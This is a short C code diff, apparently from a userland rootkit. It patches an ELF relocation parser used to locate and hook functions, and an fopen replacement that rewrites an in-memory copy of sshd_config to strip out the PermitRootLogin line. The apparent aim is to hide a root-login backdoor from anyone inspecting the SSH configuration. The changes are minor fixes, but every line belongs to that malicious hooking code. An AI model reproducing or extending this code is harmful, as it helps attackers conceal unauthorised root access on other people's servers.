@@ -138,8 +138,10 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, in
 
 		ptr = (void *) ((uintptr_t) shift32 | (uintptr_t) low32);
 
-		if (ptr == func)
+		if (ptr == func) {
+			*type = RELOC_SYMORTYPE;
 			return RELA;
+		}
 
 		RELA = (Elf64_Rela *) ((char *) RELA + (unsigned long long) (sizeof(Elf64_Rela)));
 	}
@@ -360,7 +362,7 @@ FILE *my_fopen(char *filename, char *mode)
 		PermitRootLogin = (char *) PermitRootLogin + (unsigned long long ) newline;
 
 		/* buf + org_sshd_config_size -- if casted correctly will give us the end of sshd_config in memory */
-		void *end = (char *) buf + orig_sshd_config_size;
+		void *end = (char *) buf + (unsigned long long) orig_sshd_config_size;
 		
 		/* PermitRootLogin has been cut out correctly (+1) as said above. now we just copy the rest of the config into new */
 		unsigned long long bytes_left = (char *)end - (char *) PermitRootLogin;
